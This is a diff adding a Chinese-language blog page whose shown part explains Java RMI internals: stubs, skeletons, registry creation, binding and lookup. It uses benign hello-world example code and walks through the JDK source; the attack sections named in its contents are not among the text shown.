@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2023/12/25/RMI-attack/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/12/25/RMI-attack/","path":"2023/12/25/RMI-attack/","title":"RMI反序列化初探"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>RMI反序列化初探 | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RMI"><span class="nav-text">RMI</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%87%E7%A8%8B"><span class="nav-text">过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="nav-text">代码实现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">源码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%9B%E5%BB%BA"><span class="nav-text">远程对象的创建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E7%9A%84%E5%88%9B%E5%BB%BA"><span class="nav-text">注册中心的创建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B3%A8%E5%86%8C"><span class="nav-text">服务的注册</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%B7%E6%B1%82%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83-%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="nav-text">客户端请求注册中心-客户端</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%B7%E6%B1%82%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83-%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E7%AB%AF"><span class="nav-text">客户端请求注册中心-注册中心端</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%B7%E6%B1%82%E6%9C%8D%E5%8A%A1%E7%AB%AF-%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="nav-text">客户端请求服务端-客户端</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%B7%E6%B1%82%E6%9C%8D%E5%8A%A1%E7%AB%AF-%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="nav-text">客户端请求服务端-服务端</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DGC"><span class="nav-text">DGC</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="nav-text">攻击思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0"><span class="nav-text">攻击实现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="nav-text">客户端攻击服务端</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="nav-text">注册中心攻击客户端</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BBJRMP%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="nav-text">攻击JRMP客户端</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DGC%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="nav-text">DGC攻击服务端</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-text">结语</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/25/RMI-attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="RMI反序列化初探 | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          RMI反序列化初探
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-12-25 00:41:11" itemprop="dateCreated datePublished" datetime="2023-12-25T00:41:11+08:00">2023-12-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index"><span itemprop="name">java反序列化</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><p>关于RMI这部分的学习：<a target="_blank" rel="noopener" href="https://su18.org/post/rmi-attack/">Java RMI 攻击由浅入深 | 素十八</a> 以及 <a target="_blank" rel="noopener" href="https://halfblue.github.io/2021/10/26/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">RMI反序列化漏洞之三顾茅庐-流程分析 | Halfblue</a>，大佬们的文章就是这么有营养，再推个视频：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1L3411a7ax">Java反序列化RMI专题</a></p>
+<p>RMI，即 <strong>Remote Method Invocation</strong>，Java 的远程方法调用。RMI 为应用提供了远程调用的接口，可以理解为 Java 自带的 RPC 框架，实现RMI的协议叫JRMP，RMI实现的过程中进行了java对象的传递，自然使用了序列化和反序列化，也自然产生了反序列化漏洞。</p>
+<a id="more"></a>
+
+<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>首先引入两个概念：存根(stub) 以及 服务端骨架(skeletons)</p>
+<blockquote>
+<p>为了屏蔽网络通信的复杂性，RMI 引入了两个概念，分别是 Stubs（客户端存根） 以及 Skeletons（服务端骨架），当客户端（Client）试图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stub，而在调用远端（Server）的目标类之前，也会经过一个对应的远端代理类，就是 Skeleton，它从 Stub 中接收远程方法调用并传递给真实的目标类。Stubs 以及 Skeletons 的调用对于 RMI 服务的使用者来讲是隐藏的，我们无需主动的去调用相关的方法。但实际的客户端和服务端的网络通信时通过 Stub 和 Skeleton 来实现的。</p>
+</blockquote>
+<p>那么RMI的整个调用过程如下：</p>
+<p>当客户端调用远程对象方法时, <strong>存根</strong> 负责把要调用的远程对象方法的方法名及其参数编组打包,并将该包向下经远程引用层、传输层 <strong>转发给远程对象所在的服务器</strong>。通过 RMI 系统的 <strong>RMI 注册表</strong> 实现的简单服务器名字服务, 可定位远程对象所在的服务器。该包到达服务器后, 向上经远程引用层, 被远程对象的 Skeleton 接收, 此 Skeleton 解析客户包中的方法名及编组的参数后, <strong>在服务器端执行客户要调用的远程对象方法</strong>, 然后将 <strong>该方法的返回值</strong>( 或产生的异常) 打包后通过相反路线返回给客户端, 客户端的 Stub 将返回结果解析后传递给客户程序。</p>
+<p>分开来说：</p>
+<ul>
+<li>1、客户调用客户端辅助对象stub上的方法</li>
+<li>2、客户端辅助对象stub打包调用信息（变量、方法名），通过网络发送给服务端辅助对象skeleton</li>
+<li>3、服务端辅助对象skeleton将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象</li>
+<li>4、调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象skeleton</li>
+<li>5、服务端辅助对象将结果打包，发送给客户端辅助对象stub</li>
+<li>6、客户端辅助对象将返回值解包，返回给调用者</li>
+<li>7、客户获得返回值</li>
+</ul>
+<p>那么以两张图片来总结</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/98f888122f0c4c998d65bb6b475145e6.png"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/c1bfc6b1cc5747c89c89047422e0d745.png"></p>
+<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><p>首先客户端与服务端都需要定义一个能够远程调用的接口，此接口必须扩展 <strong>java.rmi.Remote</strong> 接口，这个接口中的所有方法都必须声明抛出 <strong>java.rmi.RemoteException</strong> 异常</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    <span class="function">String <span class="title">sayGoodbye</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后创建一个远程接口的实现类，在这个类中重写方法是执行真正的代码逻辑的地方，通常会扩展 <strong>java.rmi.server.UnicastRemoteObject</strong> 类，扩展此类后，RMI 会自动将这个类 export 给远程想要调用它的 Client 端。这里必须为这个实现类提供一个构造函数并且抛出 RemoteException。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloworld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHelloworld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="comment">// 因为 UnicastRemoteObject 构造器抛出 RemoteException</span></span><br><span class="line">        <span class="comment">// 所以此处只能声明一个构造器并抛出对应异常</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayGoodbye</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bye&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来通过 Registry 使用注册来查找一个远端对象的引用，我们通常使用 <strong>LocateRegistry#createRegistry()</strong> 方法来创建注册中心，然后使用bind进行绑定</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Registry r = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry Start&quot;</span>);</span><br><span class="line">        RemoteHelloworld remoteHelloworld = <span class="keyword">new</span> RemoteHelloworld();</span><br><span class="line">        r.bind(<span class="string">&quot;hello&quot;</span>,remoteHelloworld);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后客户端进行调用：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取注册中心</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        Hello stub = (Hello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(stub.sayHello());</span><br><span class="line">        System.out.println(stub.sayGoodbye());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>深入源码进行分析</p>
+<h2 id="远程对象的创建"><a href="#远程对象的创建" class="headerlink" title="远程对象的创建"></a>远程对象的创建</h2><p>这一部分的源码大多是设计到TCP的一些类，多层的封装，写的代码相当的绕。</p>
+<p>那么首先我们创建了一个远程对象</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RemoteHelloworld remoteHelloworld &#x3D; new RemoteHelloworld();</span><br></pre></td></tr></table></figure>
+
+<p>那么这个类继承了 <strong>UnicastRemoteObject</strong> ，我们来断点调试一下，在调用类的构造方法时会走到 UnicastRemoteObject 的构造方法，传入port默认为0</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707134331917.png" alt="image-20220707134331917"></p>
+<p>调用其exportObject方法，从名字可以看出，该方法会将我们的远程对象进行一个导出，所以重点看一下这个方法，该方法接受port后创建了一个 <strong>UnicastServerRef</strong> 的对象，其中 UnicastServerRef 类主要与TCP等网络链接相关，那么其中存在着多层的封装，这里就不再进行分析，关于这一部分的详细RMI源码分析：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1648304">RMI源码分析 - 腾讯云开发者社区</a></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707141445463.png" alt="image-20220707141445463"></p>
+<p>接着往下，其中ref(LiveRef类)为真正处理TCP网络相关的。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707142556716.png" alt="image-20220707142556716"></p>
+<p>return时又进入了 <strong>UnicastServerRef#exportObject</strong> ，定义了stub即存根，通过 <strong>sun.rmi.server.Util#createProxy()</strong> 创建代理</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707144204598.png" alt="image-20220707144204598"></p>
+<p>可以看到创建了一个动态代理</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707170741843.png" alt="image-20220707170741843"></p>
+<p>返回后，创建 <strong>sun.rmi.transport.Target</strong> 对象，使用这个 <strong>target</strong> 对象封装了我们远程执行方法和生成的动态代理类（Stub）。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707171631905.png" alt="image-20220707171631905"></p>
+<p>接着调用 <strong>LiveRef#exportObject</strong> 将target发布，接着往下跟到了 <strong>TCPTransport#exportObject</strong>，首先通过 <strong>listen()</strong> 为本地的stub开启了一个随机的端口。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707172613049.png" alt="image-20220707172613049"></p>
+<p>然后调用 <strong>TCPTransport#exportObject</strong> 方法将 target 实例注册到 <strong>ObjectTable</strong> 中。ObjectTable 用来管理所有发布的服务实例 Target，ObjectTable 提供了根据 ObjectEndpoint 和 Remote 实例两种方式查找 Target 的方法（不同参数的 getTarget 方法）。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707174749252.png" alt="image-20220707174749252"></p>
+<p><strong>ObjectTable#putTarget</strong> ，最后将target 添加到 <strong>objTable</strong> 中</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707174726243.png" alt="image-20220707174726243"></p>
+<p>总结：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707174925781.png" alt="image-20220707174925781"></p>
+<h2 id="注册中心的创建"><a href="#注册中心的创建" class="headerlink" title="注册中心的创建"></a>注册中心的创建</h2><p>注册中心的创建通过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Registry r &#x3D; LocateRegistry.createRegistry(1099);</span><br></pre></td></tr></table></figure>
+
+<p>实例化了  RegistryImpl 并传入默认端口1099</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707183331996.png" alt="image-20220707183331996"></p>
+<p>创建LiveRef对象用于网络相关，然后创建 <strong>UnicastServerRef</strong> 对象，调用setup方法</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707184542394.png" alt="image-20220707184542394"></p>
+<p>在setup方法中依然调用 UnicastServerRef 的 exportObject 方法去 export 对象，只不过这次export的是 <strong>RegistryImpl</strong> 这个对象。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707185003061.png" alt="image-20220707185003061"></p>
+<p>熟悉的配方 通过createProxy()创建动态代理</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707190018636.png" alt="image-20220707190018636"></p>
+<p>但是这里与创建远程对象有一点的不同，这里有一个 <strong>stubClassExists</strong> 的判断，如果为真，则调用 <strong>cerateStub()</strong> 后直接返回</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707190214545.png" alt="image-20220707190214545"></p>
+<p>来看一下判断，去获取要创建代理的类的名字加上 <strong>_Stub</strong> 是否存在</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707190436980.png" alt="image-20220707190436980"></p>
+<p>这里是存在的</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707190833053.png" alt="image-20220707190833053"></p>
+<p>然后在createStub中，通过构造方法返回一个 <strong>RegistryImpl_Stub</strong> 实例对象</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707191149705.png" alt="image-20220707191149705"></p>
+<p>RegistryImpl_Stub 继承了 RemoteStub ，实现了 Registry。这个类实现了 bind/list/lookup/rebind/unbind 等 Registry 定义的方法，全部是通过序列化和反序列化来实现的。</p>
+<p>createProxy 创建完代理类之后进入 <strong>setSkeleton()</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707191719782.png" alt="image-20220707191719782"></p>
+<p>其中通过<strong>Util#createSkeleton</strong>方法创建 skeleton。skel接收返回值</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707191846790.png" alt="image-20220707191846790"></p>
+<p>去实例化一个 <strong>RegistryImpl_Skel</strong> 对象，返回到 UnicastServerRef 的 <strong>this.skel</strong> 中</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707192111107.png" alt="image-20220707192111107"></p>
+<p>结束完 setSkeleton() 之后，剩下的export步骤一样，创建target对象进行封装，然后放入到 <strong>objTable</strong> 中</p>
+<p>来看一下objTable中的值，目前有三个</p>
+<p>第一个为DGC为垃圾回收，默认创建</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707193618067.png" alt="image-20220707193618067"></p>
+<p>第二个为创建的远程对象，stub为动态代理对象，skel为空</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707193707161.png" alt="image-20220707193707161"></p>
+<p>第三个为注册中心，stub为 RegistryImpl_Stub 对象，skel为 RegistryImpl_Skel 对象</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707193754466.png" alt="image-20220707193754466"></p>
+<h2 id="服务的注册"><a href="#服务的注册" class="headerlink" title="服务的注册"></a>服务的注册</h2><p>这里就是对于 <strong>bind</strong> 操作的过程</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">r.bind(&quot;hello&quot;,remoteHelloworld);</span><br></pre></td></tr></table></figure>
+
+<p>通常情况下，如果 Server 端和 Registry 在同一机器，我们可以直接调用 Registry 的 bind 方法进行绑定，具体实现在 RegistryImpl 的 bind 方法，就是将 Remote 对象和名称 String 放在成员变量 <strong>bindings</strong> 中，这是一个 Hashtable 对象。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707194600968.png" alt="image-20220707194600968"></p>
+<h2 id="客户端请求注册中心-客户端"><a href="#客户端请求注册中心-客户端" class="headerlink" title="客户端请求注册中心-客户端"></a>客户端请求注册中心-客户端</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Registry registry &#x3D; LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span><br></pre></td></tr></table></figure>
+
+<p><strong>LocateRegistry#getRegistry()</strong> 首先通过传入的host与port创建了一个liveref用于网络请求，然后通过UnicastRef进行封装，然后与注册中心的代理注册逻辑一样，创建了相同的一个 RegistryImpl_Stub 对象</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707230700835.png" alt="image-20220707230700835"></p>
+<p>接下来通过lookup方法与registry端通信，查找远程对象从而获取存根</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello stub &#x3D; (Hello) registry.lookup(&quot;hello&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>方法的开始通过newCall与registry进行通信，下面分为三个部分：</p>
+<ol>
+<li>通过<strong>序列化</strong>将要查找的name写到输出流里面</li>
+<li>调用UnicastRef的 <strong>invoke</strong> 方法，invoke中调用 <strong>StreamRemoteCall#executeCall</strong>，去释放输出流</li>
+<li>获取输入流，将返回值进行 <strong>反序列化</strong></li>
+</ol>
+<p>第三步返回值经过反序列化之后就是获取的注册中心的动态代理stub</p>
